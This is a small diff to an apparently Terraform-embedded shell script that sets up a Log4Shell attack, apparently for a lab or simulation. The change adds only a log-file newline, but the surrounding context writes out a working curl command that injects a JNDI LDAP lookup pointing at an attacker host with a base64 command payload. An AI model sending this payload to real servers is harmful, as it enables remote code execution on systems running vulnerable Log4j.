@@ -40,6 +40,7 @@ locals {
     log "target available - sending payload";
     sleep 5;
     curl --verbose ${local.target_ip}:${local.target_port} -H 'X-Api-Version: $${jndi:ldap://${local.attacker_ip}:${local.attacker_ldap_port}/Basic/Command/Base64/${local.base64_log4shell_payload}}' >> $LOGFILE 2>&1;
+    echo "\n" >> $LOGFILE
     log "payload sent sleeping..."
     log "done";
     EOT
